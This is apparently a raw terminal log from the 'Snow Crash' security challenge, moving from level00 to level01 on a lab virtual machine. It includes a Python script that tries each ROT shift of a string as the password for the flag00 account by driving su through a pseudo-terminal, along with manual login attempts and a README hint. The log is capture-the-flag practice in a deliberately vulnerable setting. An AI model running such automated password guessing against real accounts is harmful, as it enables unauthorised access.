level00    11658  0.0  0.5  18144 10780 pts/0    T    00:51   0:00 python3 -c  import pty, os, time  s = "f2av5il02puano7naaf6adaf3a"  for i in range(26):     pwd = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s)     pid, fd = pty.fork()     if pid == 0:         os.execlp("su", "su", "flag00", "-c", "whoami")     else:         time.sleep(0.05)         os.write(fd, (pwd + "\n").encode())         output = b""         while True:             try:                 data = os.read(fd, 1024)                 if not data: break                 output += data             except OSError:                 break         os.waitpid(pid, 0)         if b"flag00" in output and b"Authentication failure" not in output:             print(f"\n[+] ¡CONTRASEÑA ENCONTRADA! ROT-{i:02d}: {pwd}")             break 
level00    12749  0.0  0.1   6544  2284 pts/0    S+   01:07   0:00 grep --color=auto flag00
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ python3 -c '
s = "favilpuanonaafadafa"
for shift in range(26):
    res = "".join(chr((ord(c) - 97 + shift) % 26 + 97) if "a" <= c <= "z" else c for c in s)
    print(f"ROT-{shift:02d}: {res}")
'
ROT-00: favilpuanonaafadafa
ROT-01: gbwjmqvbopobbgbebgb
ROT-02: hcxknrwcpqpcchcfchc
ROT-03: idylosxdqrqddidgdid
ROT-04: jezmptyersreejeheje
ROT-05: kfanquzfstsffkfifkf
ROT-06: lgborvagtutgglgjglg
ROT-07: mhcpswbhuvuhhmhkhmh
ROT-08: nidqtxcivwviinilini
ROT-09: ojeruydjwxwjjojmjoj
ROT-10: pkfsvzekxyxkkpknkpk
ROT-11: qlgtwaflyzyllqlolql
ROT-12: rmhuxbgmzazmmrmpmrm
ROT-13: snivychnabannsnqnsn
ROT-14: tojwzdiobcbootoroto
ROT-15: upkxaejpcdcppupspup
ROT-16: vqlybfkqdedqqvqtqvq
ROT-17: wrmzcglreferrwrurwr
ROT-18: xsnadhmsfgfssxsvsxs
ROT-19: ytobeintghgttytwtyt
ROT-20: zupcfjouhihuuzuxuzu
ROT-21: avqdgkpvijivvavyvav
ROT-22: bwrehlqwjkjwwbwzwbw
ROT-23: cxsfimrxklkxxcxaxcx
ROT-24: dytgjnsylmlyydybydy
ROT-25: ezuhkotzmnmzzezczez
level00@snowcrash:~$ exit
logout
There are stopped jobs.
level00@snowcrash:~$ ssh level01@127.0.0.1 -p 2424
ssh: connect to host 127.0.0.1 port 2424: Connection refused
level00@snowcrash:~$ ssh level01@127.0.0.1 -p 2424
ssh: connect to host 127.0.0.1 port 2424: Connection refused
level00@snowcrash:~$ exit
logout
There are stopped jobs.
level00@snowcrash:~$ exit
logout
Connection to localhost closed.
robi@robi-HP:~$ ssh level01@localhost -p 2424
level01@localhost's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 System information as of Sat Sep 26 01:25:39 AM UTC 2026

  System load:             0.0
  Usage of /:              47.9% of 9.74GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               120
  Users logged in:         1
  IPv4 address for enp0s3: 10.0.2.15
  IPv6 address for enp0s3: fd17:625c:f037:2:a00:27ff:fe0f:c02a

 ____                         ____               _     
/ ___| _ __   _____      __  / ___|_ __ __ _ ___| |__  
\___ \| '_ \ / _ \ \ /\ / / | |   | '__/ _` / __| '_ \ 
 ___) | | | | (_) \ V  V /  | |___| | | (_| \__ \ | | |
|____/|_| |_|\___/ \_/\_/    \____|_|  \__,_|___/_| |_|
                                                       
  42 Network Security Challenge — v2   @wil

level01@snowcrash:~$ ls -la
total 28
drwxr-x---  3 level01 level01 4096 Sep 26 01:23 .
drwxr-xr-x 37 root    root    4096 Jun  9 19:04 ..
-rw-r--r--  1 level01 level01  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level01 level01 3771 Mar 31  2024 .bashrc
drwx------  2 level01 level01 4096 Sep 26 01:23 .cache
-rw-r--r--  1 level01 level01  807 Mar 31  2024 .profile
-r--r--r--  1 level01 level01   33 Jun  9 19:03 README
level01@snowcrash:~$ cat README
Gargoyles never stop collecting.
level01@snowcrash:~$ 

